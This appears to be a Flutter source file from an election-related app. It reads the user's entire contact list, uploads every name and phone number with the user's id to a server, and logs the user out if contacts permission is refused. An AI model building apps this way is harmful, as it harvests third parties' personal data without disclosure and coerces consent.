import 'dart:convert';

import 'package:eleins/apiurl.dart';
import 'package:eleins/home.dart';
import 'package:eleins/login.dart';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:baseflow_plugin_template/baseflow_plugin_template.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';




class permission_handler extends StatefulWidget {
  const permission_handler({super.key});

  @override
  State<permission_handler> createState() => _permission_handlerState();
}

class _permission_handlerState extends State<permission_handler> {

   List<Contact> _contacts = [];
    bool loaded=false;

  @override
  void initState() {
    super.initState();
    _getContacts();
  
  }

  Future<void> _getContacts() async {
    if (await Permission.contacts.request().isGranted) {
      // Permission is granted
      List<Contact> contacts =
          (await ContactsService.getContacts()).toList();
      setState(() {
        _contacts = contacts;
         _sendContactsToServer();
      });
    } else {
      // Permission is not granted
      print('Permission not granted');

        SharedPreferences prefs = await SharedPreferences.getInstance();
   prefs.remove('status')!;
  prefs.remove("stateid");
  prefs.remove("userid");
  prefs.remove("cityid");
  prefs.remove("consitituencyno");
  prefs.remove("contactinfo");
  
    Navigator.pushReplacement(context, MaterialPageRoute(builder: (context)=>LoginPage()));
        
    }
   
  }

  Future<void> _sendContactsToServer() async {
  
  SharedPreferences prefs = await SharedPreferences.getInstance();

  var userid=prefs.getString("userid");
  
    // Convert contacts to a JSON string
   
    List<Map<String, dynamic>> contactsList = _contacts.map((contact) {
      // Extract necessary information from the contact
      return {
        'displayName': contact.displayName ?? '',
        'phones': contact.phones?.map((phone) => phone.value).toList() ?? [],
        'userid':userid
        // Add more fields if needed
      };
    }).toList();


    // Convert the list of maps to a JSON string
    String jsonData = jsonEncode(contactsList);


print(jsonData);
    // Example server endpoint URL
    String newre=api().apiserve;
    String serverUrl = '$newre/getcontact.php';

    try {
      // Send contacts to server
      var response = await http.post(
        Uri.parse(serverUrl),
        headers: {'Content-Type': 'application/json'},
        body: jsonData,
      );

      if (response.statusCode == 200) {
        // Contacts successfully sent to server
        SharedPreferences prefs = await SharedPreferences.getInstance();
        await prefs.setBool("contactinfo",true);
     Navigator.pushReplacement(context,MaterialPageRoute(builder: (context)=>home()));
      } else {
        // Error sending contacts to server
        print('Error sending contacts: ${response.statusCode}');
      }
    } catch (e) {
      print('Error sending contacts: $e');
    }
  }
  @override
  Widget build(BuildContext context) {
    return Scaffold(

      body: Center(child: CircularProgressIndicator()),
    );
  }
}